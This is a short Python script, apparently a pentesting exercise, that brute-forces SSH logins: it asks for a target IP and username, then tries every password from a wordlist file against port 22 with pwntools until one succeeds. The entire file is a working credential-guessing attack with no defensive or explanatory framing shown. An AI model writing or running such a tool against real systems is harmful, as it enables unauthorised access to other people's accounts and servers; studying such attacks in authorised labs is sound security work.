from pwn import *
import paramiko

host = input("Enter IP: ")
username = input("Enter username: ")
attempts = 0

with open("ssh-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print(f"[{attempts}] Attempting password: '{password}'!")
            response = ssh(host=host, user=username, password=password, port=22, timeout=1)
            if response.connected():
                print(f"[<] Valid password found: '{password}'!")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1

